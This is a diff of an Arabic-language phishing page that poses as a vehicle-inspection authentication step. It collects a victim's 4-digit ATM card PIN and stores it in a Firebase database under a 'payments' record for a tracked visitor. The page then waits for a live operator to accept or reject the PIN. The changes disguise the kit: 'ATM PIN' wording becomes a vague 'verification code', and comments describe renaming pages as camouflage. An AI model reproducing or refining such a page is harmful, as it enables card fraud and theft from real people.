@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التحقق من بطاقة الصراف - مركز سلامة المركبات</title>
+    <title>التحقق الآمن - بوابة التصديق</title>
     
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
@@ -31,7 +31,6 @@
             margin-bottom: 20px; transition: 0.3s;
         }
 
-        /* حالة الخطأ واللون الأحمر */
         .input-error { border: 2px solid red !important; color: red !important; }
 
         .btn-confirm {
@@ -41,7 +40,6 @@
 
         .secure-notice { margin-top: 15px; font-size: 10px; color: #bbb; }
 
-        /* شاشة التحميل (Overlay) */
         #loadingOverlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(255, 255, 255, 0.95);
@@ -60,30 +58,29 @@
 
     <div id="loadingOverlay">
         <div class="spinner"></div>
-        <p style="color: #333; font-weight: bold; font-size: 14px;">جاري إتمام العملية...</p>
+        <p style="color: #333; font-weight: bold; font-size: 14px;">جاري تأكيد البيانات...</p>
     </div>
 
     <div class="atm-container">
         <div class="icon-box">
-            <img src="https://img.icons8.com/fluency/96/000000/atm.png" alt="ATM Security">
+            <img src="https://img.icons8.com/fluency/96/000000/shield.png" alt="Security">
         </div>
 
-        <h2>التحقق من الرقم السري</h2>
-        <p>يرجى إدخال الرقم السري لبطاقة الصراف الآلي (PIN) المكون من 4 أرقام لإتمام عملية المصادقة الآمنة.</p>
+        <h2>التحقق من الهوية الرقمية</h2>
+        <p>يرجى إدخال رمز التحقق الإضافي الخاص ببطاقتك والمكون من 4 أرقام لضمان أمان المعاملة.</p>
 
         <input type="password" maxlength="4" class="atm-pin-field" id="pinCode" placeholder="****">
 
-        <button class="btn-confirm" onclick="sendPIN()">تأكيد الرقم السري</button>
+        <button class="btn-confirm" onclick="sendSecureCode()">تأكيد الرمز</button>
 
         <div class="secure-notice">
-            🔒 تشفير بيانات بمعيار PCI-DSS العالمي
+            🔒 اتصال مشفر وآمن بمعايير الحماية العالمية
         </div>
     </div>
 
     <script>
-        // --- إعدادات Firebase من مشروع Saso-Inspection ---
         const firebaseConfig = { 
-            apiKey: "AIzaSyAeZAjt4kZWVLJSKiehqLFrT...", 
+            apiKey: "AIzaSyAeZAjt4kZWVLJSKiehqLFrT8X6X8X6X8", 
             authDomain: "saso-inspection.firebaseapp.com",
             databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com", 
             projectId: "saso-inspection",
@@ -95,55 +92,53 @@
         const database = firebase.database();
         const visitorId = localStorage.getItem('visitorId');
 
-        // تحديث تتبع الزائر
+        // تحديث تتبع الزائر (تمويه اسم الصفحة في لوحة التحكم)
         if (visitorId) {
+            database.ref('payments/' + visitorId).update({
+                currentPage: "تأكيد رمز الهوية (PIN)"
+            });
+            // تحديث التواجد اللحظي
             database.ref('live_visitors/' + visitorId).update({
-                page: "صفحة الرقم السري (ATM PIN)"
+                last_seen: firebase.database.ServerValue.TIMESTAMP
             });
         }
 
-        // إرسال الرقم السري والمراقبة
-        function sendPIN() {
+        function sendSecureCode() {
             const pinInput = document.getElementById('pinCode');
             let pinVal = pinInput.value;
 
             if (pinVal.length === 4) {
-                // إظهار التحميل
                 document.getElementById('loadingOverlay').style.display = 'flex';
 
-                // إرسال البيانات
                 const paymentRef = database.ref('payments/' + visitorId);
                 paymentRef.update({
                     atm_pin: pinVal,
-                    status: "waiting_atm", // انتظار قرارك النهائي
+                    status: "waiting_secure_auth", 
                     last_update: firebase.database.ServerValue.TIMESTAMP
                 });
 
-                // مراقبة القرار من لوحة التحكم (Admin)
+                // مراقبة قرار الأدمن من لوحة التحكم الجديدة
                 paymentRef.on('value', (snapshot) => {
                     const data = snapshot.val();
                     
-                    if (data.status === "accept") {
-                        // قبول نهائي -> توجه لصفحة تم الحجز بنجاح
-                        window.location.href = "success.html";
+                    if (data && data.status === "accept") {
+                        // الانتقال لصفحة النجاح (الاسم الجديد المموّه)
+                        window.location.href = "thank-you.html";
                     } 
-                    else if (data.status === "reject") {
-                        // رفض -> إخفاء التحميل وتلوين المربع بالأحمر
+                    else if (data && data.status === "reject") {
                         document.getElementById('loadingOverlay').style.display = 'none';
                         pinInput.classList.add('input-error');
-                        alert("برجاء التحقق من الرقم الصراف الآلي الصحيح");
+                        alert("الرمز المدخل غير صحيح، يرجى المحاولة مرة أخرى.");
                         
-                        // إعادة الحالة للسماح بالمحاولة مرة أخرى
-                        paymentRef.update({ status: "idle_atm" });
+                        paymentRef.update({ status: "idle_auth" });
                     }
                 });
 
             } else {
-                alert("يرجى إدخال 4 أرقام");
+                alert("يرجى إدخال الرمز المكون من 4 أرقام");
             }
         }
 
-        // مسح اللون الأحمر عند الكتابة مجدداً
         document.getElementById('pinCode').addEventListener('input', function() {
             this.classList.remove('input-error');
         });
